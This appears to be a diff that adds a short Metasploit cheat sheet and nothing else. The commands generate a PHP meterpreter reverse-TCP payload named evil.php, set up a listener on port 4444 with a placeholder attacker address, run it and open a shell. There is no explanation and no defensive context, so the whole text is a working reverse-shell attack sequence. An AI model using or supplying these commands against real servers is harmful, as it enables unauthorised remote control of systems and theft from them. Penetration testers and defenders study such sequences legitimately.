@@ -1,0 +1,18 @@
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o evil.php
+
+msf > use exploit/multi/handler 
+
+ msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp 
+
+ PAYLOAD => php/meterpreter/reverse_tcp 
+
+ msf exploit(handler) > set LHOST [IP] 
+
+ LHOST => [IP] 
+
+ msf exploit(handler) > set LPORT 4444 
+
+ LPORT => 4444 
+
+ msf exploit(handler) > exploit
+msf>shell
